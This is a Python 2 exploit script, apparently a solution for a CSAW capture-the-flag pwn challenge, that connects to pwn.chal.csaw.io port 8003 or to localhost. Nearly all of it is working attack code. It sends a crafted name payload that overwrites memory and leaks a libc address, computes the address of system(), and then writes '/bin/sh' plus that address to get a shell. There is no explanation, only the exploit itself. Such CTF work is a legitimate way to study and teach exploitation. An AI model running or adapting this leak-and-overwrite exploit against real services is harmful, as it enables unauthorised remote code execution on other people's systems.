#usr/bin/python
import random
import sys
import socket
import string
import base64
import time
import os
import re
import select
VERBOSE=1
NOM='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'
ALPHABET="abcdefghijklmnopqrstuvwxyz"
indice=len(ALPHABET)-1

def lettre():
    global indice
    indice=(indice+1)%len(ALPHABET)
    return(ALPHABET[indice])
    
def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret  = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret

def str16_to_adr(s,n=4):
        a=0
        for i in range(n-1,-1,-1):
                a=a*256+ord(s[i])
        return a

def adr_to_str32(add):
    ret=adr_to_str16(add%4294967296)+adr_to_str16(add//4294967296)
    return ret

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s=s+"0"
    return(s)

def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8):
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        if (num < 0):
            n=(-1)*num
            ps="-"
            num=-num
        else:
            n=num
            ps=""
        s=""
        while((nb>0) or (num != 0)):
                s=numerals[num % b]+s
                num=num//b
                nb=nb-1
        return ps+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s

def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)


def blword(t):
    p=1
    s=0
    for l in t:
        s=s+l*p
        p=p*256
    return(s)



def str_to_lst(s):
    l=[]
    for i in range(len(s)):
        l=l+[ord(s[i])]
    return(l)

def sort_hexa(s,n):
    print s,baseN(n,16,8)
def affiche(t):
    pile=[]
    for i in range((len(t)/8)):
        s=blword(t[8*i:8*(i+1)])
        print baseN(s,16,16),
        pile=pile+[s]
    print " "
    return(pile)

def affichent(t):
    pile=[]
    for s in t:
        print baseN(s,16,16),
        pile=pile+[s]
    print " "
    return(pile)

def lst_out(liste):
    for i in liste:
        print baseN(i,16,16),
    print " "
    

def bigread(s,mot,init):
    b=init
    while(re.search(mot,b) == None):
        r=s.recv(1024)
        if (VERBOSE==1):
            print r,
        b=b+r
    return(b)


def big2read(s,mot1,mot2,init):
    b=init
    while((re.search(mot1,b) == None) and (re.search(mot2,b) == None)):
        r=s.recv(1024)
        if (VERBOSE==1):
            print r,
        b=b+r
    return(b)

if (sys.argv[1]=='0'):
    HOST = "localhost"
    PORT = 8003
    offset_system = 0x0000000000041490
    offset_start=0x021a50
    TIME=0.02

else:
    HOST = "pwn.chal.csaw.io"
    PORT = 8003
    offset_system = 0x000000000045380
    offset_start=0x020740
    TIME=0.2

s = socket.socket()
s.connect((HOST, PORT))
time.sleep(TIME)
readbuffer=bigread(s,"name?","")
readbuffer=bigread(s,"\n",readbuffer)
print "(0)",readbuffer
s.send(NOM)
time.sleep(TIME)
readbuffer=bigread(s,"_\n",readbuffer)
s.send(lettre()+"\n")
time.sleep(TIME)
readbuffer=bigread(s,"\n","")
while (re.search('name?',readbuffer)==None):
    s.send(lettre()+"\n")
    time.sleep(TIME)
    readbuffer=big2read(s,"\n",'name?',"")
    print "(*)",readbuffer
print "OK..."

START=0x602068
# __memcpy_sse2_unaligned
NOM2='aaaabbbbCCCCDDDDEEEEFFFFGGGGHHHH'+"\x00"*8+"\x91"+"\x00"*7+"\x00"*4+adr_to_str16(len(NOM))+adr_to_str32(START)
time.sleep(TIME)
s.send("y"+"\n")
time.sleep(TIME)
raw_input()
s.send(NOM2+"\n")
time.sleep(TIME)
readbuffer=bigread(s,"Continue?","")
LIBCSTART=blword(str_to_lst(readbuffer[readbuffer.index("yer:")+5:readbuffer.index("yer:")+11]))
dump(0,readbuffer)
print "START=",baseN(LIBCSTART,16,16)

time.sleep(TIME)
s.send("y"+"\n")
readbuffer=bigread(s,"_\n",readbuffer)
s.send(lettre()+"\n")
time.sleep(TIME)
readbuffer=bigread(s,"\n","")
while (re.search('name?',readbuffer)==None):
    s.send(lettre()+"\n")
    time.sleep(TIME)
    readbuffer=big2read(s,"\n",'name?',"")
    print "(*)",readbuffer
print "OK..."

# on ecrase __libc_start par /bin/sh\0

SYSTEM=LIBCSTART-offset_start+offset_system
print "SYSTEM=",baseN(SYSTEM,16,16)
NOM2='/bin/sh'+"\x00"+'CCCCDDDD'+adr_to_str32(SYSTEM)
time.sleep(TIME)
s.send("y"+"\n")
time.sleep(TIME)
s.send(NOM2+"\n")
time.sleep(TIME)
readbuffer=bigread(s,"Continue?","")

time.sleep(TIME)
raw_input()
s.send("y"+"\n")
readbuffer=bigread(s,"_\n",readbuffer)
s.send(lettre()+"\n")
time.sleep(TIME)
readbuffer=bigread(s,"\n","")
while (re.search('name?',readbuffer)==None):
    s.send(lettre()+"\n")
    time.sleep(TIME)
    readbuffer=big2read(s,"\n",'name?',"")
    print "(*)",readbuffer
print "OK..."





s.close()
